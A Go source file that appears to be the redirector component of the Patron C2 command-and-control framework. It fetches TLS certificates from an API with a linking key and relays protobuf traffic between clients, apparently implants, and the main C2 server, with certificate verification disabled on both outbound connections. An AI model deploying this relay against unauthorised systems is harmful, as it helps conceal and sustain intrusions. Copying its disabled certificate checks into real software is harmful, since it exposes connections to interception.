package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"sync/atomic"
	"time"

	"github.com/PatronC2/Patron/lib/common"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patronobuf/go/patronobuf"
)

var (
	mainServerIP   = os.Getenv("MAIN_SERVER_IP")
	mainServerPort = os.Getenv("MAIN_SERVER_PORT")
	forwarderPort  = os.Getenv("FORWARDER_PORT")
	apiIP          = os.Getenv("API_IP")
	apiPort        = os.Getenv("API_PORT")
	linkingKey     = os.Getenv("LINKING_KEY")
	certHolder     atomic.Value
)

func main() {
	enableLogging := true
	logger.EnableLogging(enableLogging)
	common.RegisterGobTypes()

	logFileName := "logs/forwarder.log"
	err := logger.SetLogFile(logFileName)
	if err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
		return
	}

	// Initial fetch
	keyPEM, certPEM, err := sendStatusUpdate()
	if err != nil {
		logger.Logf(logger.Warning, "Failed to fetch certs from API: %v", err)
		return
	}
	cert, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
	if err != nil {
		logger.Logf(logger.Warning, "Failed to parse in-memory certificate: %v", err)
		return
	}
	certHolder.Store(cert)

	tlsConfig := &tls.Config{
		GetCertificate: func(*tls.ClientHelloInfo) (*tls.Certificate, error) {
			c := certHolder.Load()
			if c != nil {
				cert := c.(tls.Certificate)
				return &cert, nil
			}
			return nil, fmt.Errorf("no certificate loaded")
		},
	}

	go listenAndServe("0.0.0.0:"+forwarderPort, tlsConfig)
	go listenAndServe("[::]:"+forwarderPort, tlsConfig)

	go func() {
		for {
			keyPEM, certPEM, err := sendStatusUpdate()
			if err != nil {
				logger.Logf(logger.Warning, "Error sending status update: %v", err)
			} else {
				cert, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
				if err != nil {
					logger.Logf(logger.Warning, "Failed to update in-memory certificate: %v", err)
				} else {
					certHolder.Store(cert)
					logger.Logf(logger.Info, "TLS certificate updated successfully")
				}
			}
			time.Sleep(5 * time.Minute)
		}
	}()

	select {}
}

func listenAndServe(address string, tlsConfig *tls.Config) {
	listener, err := tls.Listen("tcp", address, tlsConfig)
	if err != nil {
		logger.Logf(logger.Warning, "Failed to start listener on %s: %v", address, err)
		return
	}
	defer listener.Close()
	logger.Logf(logger.Info, "Forwarder listening on %s", address)

	for {
		conn, err := listener.Accept()
		if err != nil {
			logger.Logf(logger.Warning, "Failed to accept connection on %s: %v", address, err)
			continue
		}
		go handleClientConnection(conn)
	}
}

func sendStatusUpdate() (string, string, error) {
	url := fmt.Sprintf("https://%s:%s/api/redirector/status", apiIP, apiPort)
	data := map[string]string{
		"linking_key": linkingKey,
	}
	jsonData, err := json.Marshal(data)
	if err != nil {
		return "", "", fmt.Errorf("failed to marshal JSON: %w", err)
	}

	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(jsonData))
	if err != nil {
		return "", "", fmt.Errorf("failed to create request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		return "", "", fmt.Errorf("failed to send request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return "", "", fmt.Errorf("received non-OK response: %s", resp.Status)
	}

	var response struct {
		Message    string `json:"message"`
		ServerKey  string `json:"server_key"`
		ServerCert string `json:"server_cert"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return "", "", fmt.Errorf("failed to decode response: %w", err)
	}

	return response.ServerKey, response.ServerCert, nil
}

func handleClientConnection(clientConn net.Conn) {
	defer clientConn.Close()

	mainConn, err := connectToMainServer()
	if err != nil {
		logger.Logf(logger.Warning, "Main server unavailable, retrying in 5 seconds: %v", err)
		return
	}
	defer mainConn.Close()

	clientAddr := clientConn.RemoteAddr().String()
	logger.Logf(logger.Info, "Accepted connection from %s", clientAddr)

	for {
		// Read request from client
		var request patronobuf.Request
		if err := common.ReadDelimited(clientConn, &request); err != nil {
			logger.Logf(logger.Warning, "Failed to decode request from client %s: %v", clientAddr, err)
			return
		}

		// Forward request to main server
		if err := common.WriteDelimited(mainConn, &request); err != nil {
			logger.Logf(logger.Warning, "Failed to send request to main server: %v", err)
			return
		}

		// Read response from main server
		var serverResponse patronobuf.Response
		if err := common.ReadDelimited(mainConn, &serverResponse); err != nil {
			logger.Logf(logger.Warning, "Failed to decode response from main server: %v", err)
			return
		}

		// Send response back to client
		if err := common.WriteDelimited(clientConn, &serverResponse); err != nil {
			logger.Logf(logger.Warning, "Failed to send response to client %s: %v", clientAddr, err)
			return
		}
	}
}

func connectToMainServer() (*tls.Conn, error) {
	c := certHolder.Load()
	if c == nil {
		return nil, fmt.Errorf("no TLS certificate loaded")
	}
	cert := c.(tls.Certificate)
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}

	return tls.Dial("tcp", mainServerIP+":"+mainServerPort, tlsConfig)
}
